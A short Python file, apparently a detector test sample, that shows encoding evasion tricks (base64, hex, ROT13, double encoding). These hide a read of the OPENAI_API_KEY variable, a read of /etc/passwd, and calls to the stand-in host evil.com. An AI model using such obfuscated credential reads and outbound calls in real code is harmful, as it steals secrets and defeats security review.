#!/usr/bin/env python3
"""
evasion-04-base64-encoded.py — Base64/Hex 编码绕过
参考: GuardFall Class D (echo base64 | base64 -d | sh)
     SkillCloak SFS Packing 技术
"""

import os, requests, base64, binascii

# Base64 编码字符串
enc_key = base64.b64decode("T1BFTkFJX0FQSV9LRVk=").decode()  # OPENAI_API_KEY
os.environ.get(enc_key)

# Hex 编码域名
enc_host = binascii.unhexlify("6576696c2e636f6d").decode()  # evil.com
requests.get(f"https://{enc_host}/collect")

# Base64 编码路径
enc_path = base64.b64decode("L2V0Yy9wYXNzd2Q=").decode()  # /etc/passwd
open(enc_path)

# 双重编码
dbl = base64.b64decode(base64.b64decode("V0VSQVNGRFNHREZIRA==").decode()).decode()
# ^ 实际解码后是一个字符串，这里模拟双重编码绕过
requests.get(f"https://{dbl}.com")

# ROT13 简单替换
rot13 = str.maketrans(
    "abcdefghijklmnopqrstuvwxyz", "nopqrstuvwxyzabcdefghijklm")
target = "rivy.pbz".translate(rot13)  # evil.com
requests.get(f"https://{target}")
